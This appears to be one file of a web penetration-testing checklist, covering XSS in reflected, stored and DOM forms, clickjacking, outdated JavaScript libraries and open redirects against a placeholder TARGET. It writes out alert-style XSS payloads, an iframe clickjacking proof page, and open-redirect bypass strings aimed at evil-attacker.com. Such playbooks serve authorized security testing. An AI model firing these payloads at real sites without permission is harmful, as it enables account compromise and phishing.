# Batch 01 — XSS family + clickjack + old JS + open redirect

## FILL IN

```bash
T="https://TARGET"
```

## GOAL
Finish **6 checks**: DOM XSS, Reflected XSS, Stored XSS, Clickjacking, outdated JS libraries, Open Redirect.

## TIME
1–2 hours

## YOU NEED
- Batch 00 map + param list
- Browser + proxy
- Two notes: “reflect params” and “store fields”

---

## WHY (30 seconds)

**XSS** = your script runs in the victim browser as the site.  
- **Reflected** = comes back in the **same** response as the request.  
- **Stored** = saved in DB, hits later victims.  
- **DOM** = URL/hash/fragment never needs server echo; **JS on the page** writes it unsafely (`innerHTML`, `eval`, `document.write`).  

**Clickjacking** = site in invisible iframe → user clicks wrong thing.  
**Old JS libs** = known XSS/RCE in jQuery/Angular/etc.  
**Open redirect** = `?next=` sends user to evil.com (phishing / OAuth token theft).

---

## DO THIS

### A) Reflected XSS (every reflected param)

1. From batch 00, list params that appear in HTML/JS response.  
2. Inject unique marker first:

```text
xssprobe7721
```

3. If marker returns in body, try payloads (start simple):

```text
"><img src=x onerror=alert(1)>
'><svg/onload=alert(1)>
"><script>alert(1)</script>
```

4. Encode variants if filtered:

```text
%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E
```

5. Test in **URL, body, headers** that reflect (User-Agent, Referer — rare but real).

**Win:** `alert` / script runs, or HTML context clearly breakable with impact note.

### B) Stored XSS (every save field)

1. Put marker in: name, bio, comments, filenames, support tickets, admin notes.  
2. View as other role / other user / public page.  
3. If stored raw → escalate to payloads from (A).  
4. Also check **email** and **PDF/export** if rendered as HTML.

### C) DOM XSS

1. Open DevTools → Sources → search page JS for:

```text
location.hash  location.search  document.URL  innerHTML  eval(  document.write
```

2. Put payload in hash (often never sent to server):

```text
https://TARGET/page#"><img src=x onerror=alert(1)>
https://TARGET/page?x=1#<img src=x onerror=alert(1)>
```

3. Use DOM Invader (Burp BApp) if available: crawl → sources → sinks.

**Win:** sink executes attacker-controlled source without needing server reflection.

### D) Clickjacking

1. Check headers:

```bash
curl -skI "https://TARGET/" | grep -iE 'x-frame|content-security-policy'
```

2. If **no** `X-Frame-Options: DENY|SAMEORIGIN` and CSP does not `frame-ancestors 'none'|self`:

```html
<!-- save as clickjack.html and open locally -->
<iframe src="https://TARGET/sensitive-action" width="100%" height="800"></iframe>
```

3. Sensitive targets: change email, delete, transfer, admin.

**Win:** sensitive page loads in iframe (with or without UI redress proof).

### E) Outdated JavaScript libraries

1. View source / proxy → collect `.js` URLs.  
2. Run one of:

```bash
# if retire.js installed
retire --path ./saved-js/
```

Or browser extension **Retire.js**, or [snyk](https://snyk.io)/manual version strings (`jquery-1.11.1.min.js`).

3. Map CVE → only report if **reachable** and has real impact (XSS/RCE), not “old but unused”.

### F) Open Redirect

Params to try on **every** endpoint from map:

```text
url next redirect return returnTo continue dest destination r redirect_uri goto out link
```

Payloads:

```text
https://evil-attacker.com
//evil-attacker.com
///evil-attacker.com
/\evil-attacker.com
https://TARGET.evil-attacker.com
//TARGET@evil-attacker.com
```

```bash
curl -skI "https://TARGET/login?next=https://evil-attacker.com"
# look for Location: https://evil-attacker.com
```

**Win:** 3xx Location (or meta/JS redirect) to attacker domain.

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| Reflected only in JSON API | Try `content-type` tricks / polyglots; still note if used in dangerous sink |
| DOM only | PoC with hash is enough |
| CSP blocks alert | Use CSP-bypass notes later; still report if injection exists |
| No iframe header | Clickjack ticket |

---

## NEXT
→ [02-cors-csrf-methods-headers.md](./02-cors-csrf-methods-headers.md)
